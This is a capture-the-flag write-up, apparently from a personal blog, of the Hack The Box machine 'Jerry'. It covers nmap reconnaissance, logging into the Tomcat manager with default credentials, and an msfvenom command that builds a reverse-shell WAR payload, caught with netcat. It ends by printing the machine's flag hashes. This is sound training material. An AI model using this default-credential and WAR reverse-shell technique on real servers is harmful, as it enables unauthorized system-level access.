+++
title = "HTB: Jerry"
date = "2022-07-08T13:08:16-05:00"
author = "l0gan334"
authorTwitter = "" #do not include @
cover = "Jerry.png"
tags = ["hacking", "ctf", "eJPT-like", "HTB", "windows", "apache", "tomcat"]
keywords = ["", ""]
description = "**HTB | Jerry - Write up**"
showFullContent = false
readingTime = false
hideComments = false
+++

**Jerry** is probably the easiest box in HTB, it's only challenge is to exploit an **Apache Tomcat** instance. 

We will do this by uploading a malicious **WAR file** that once opened will get us a reverse shell and access to both flags, so this time there's no privesc.

# **```Recon```**

# Nmap

The nmap scan looking for opened ports finds only one:

```bash
❯ nmap -p- -sS --min-rate 5000 --open -v -n -Pn 10.129.102.35 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked up and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 13:15 -05
Initiating SYN Stealth Scan at 13:15
Scanning 10.129.102.35 [65535 ports]
Discovered open port 8080/tcp on 10.129.102.35
Completed SYN Stealth Scan at 13:16, 26.53s elapsed (65535 total ports)
Nmap scan report for 10.129.102.35
Host is up (0.15s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
8080/tcp open  http-proxy

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.68 seconds
           Raw packets sent: 131087 (5.768MB) | Rcvd: 19 (836B)
```

This is usually a webserver and also the default port for **Apache Tomcat**:

```bash
❯ nmap -sCV -p8080 10.129.102.35 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-08 13:16 -05
Nmap scan report for 10.129.102.35
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.13 seconds
```

Indeed we seem to be dealing with a **Tomcat**, let's check it:

{{< image src="/img/jer1.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

This is the default panel so there isn't anything interesting going on here. 

In a Tomcat there's usually the route **/manager** were we can login:

{{< image src="/img/jer2.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}


Even though we have no credentials we can try with default ones:

{{< image src="/img/jer5.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

The correct one end up to be **tomcat:s3cret** and we get access:

{{< image src="/img/jer6.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

**```Foothold```**
# Exploiting Tomcat

In Tomcat there's a famous vulnerability were you are able to upload a malicious **WAR** file that will get you a reverse shell.

{{< image src="/img/jer8.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}


We can build it with **msfvenom**.

With Wappalyzer we see that the website works with java so we are going to use a java payload:

{{< image src="/img/jer9.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}



```bash
❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.161 LPORT=334 -f war -o shell.war

Payload size: 1095 bytes
Final size of war file: 1095 bytes
Saved as: shell.war
```

Now we set the netcat and upload the file:

{{< image src="/img/jer7.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}


```powershell
❯ nc -lvnp 334
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::334
Ncat: Listening on 0.0.0.0:334
Ncat: Connection from 10.129.102.35.
Ncat: Connection from 10.129.102.35:49192.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>
```

Perfect, and we are also already **system**:
```powershell
C:\apache-tomcat-7.0.88>whoami
whoami
nt authority\system
```

As a privileged user we can get both flags:
```powershell
 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  07:09 AM    <DIR>          .
06/19/2018  07:09 AM    <DIR>          ..
06/19/2018  07:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,365,947,904 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```

See you next time!